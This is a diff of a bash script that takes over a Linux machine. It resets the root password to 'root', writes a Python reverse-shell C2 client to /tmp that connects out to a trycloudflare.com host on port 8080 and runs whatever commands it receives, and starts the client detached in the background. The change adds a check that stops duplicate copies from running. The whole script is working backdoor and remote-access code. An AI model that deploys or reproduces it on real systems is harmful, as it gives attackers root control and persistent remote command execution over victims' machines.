@@ -1,15 +1,15 @@
 #!/bin/bash
-# 1. Total Takeover
+# 1. Re-assert Root Control
 echo "root:root" | sudo chpasswd
 
-# 2. Deploy the Persistent C2 Client
+# 2. Deploy the Persistent Client (Only if missing)
 cat <<EOF > /tmp/c2_client.py
 import socket, os, subprocess, time
 def connect():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # REPLACE with your Mac's Public IP or Cloudflare URL
+            # Ensure this matches your Mac's listener address/port
             s.connect(('merchandise-angeles-jade-stud.trycloudflare.com', 8080))
             while True:
                 s.send((os.getcwd() + " # ").encode())
@@ -20,11 +20,17 @@ def connect():
                 s.send(stdout + stderr)
             s.close()
         except:
-            time.sleep(5) # Persistence: Retry every 5 seconds
+            time.sleep(10) # Wait 10s before reconnecting to save resources
 if __name__ == "__main__":
     connect()
 EOF
 
-# 3. Fire and Detach
-nohup python3 /tmp/c2_client.py > /dev/null 2>&1 &
-disown
+# 3. INFINITE PROCESS PREVENTION (The Guard)
+# Checks if the script is already running to avoid "Process Fork Bombing"
+if ! pgrep -f "python3 /tmp/c2_client.py" > /dev/null; then
+    nohup python3 /tmp/c2_client.py > /dev/null 2>&1 &
+    disown
+    echo "[*] Sentinel: New C2 process started."
+else
+    echo "[!] Sentinel: C2 process already active. Skipping duplicate."
+fi
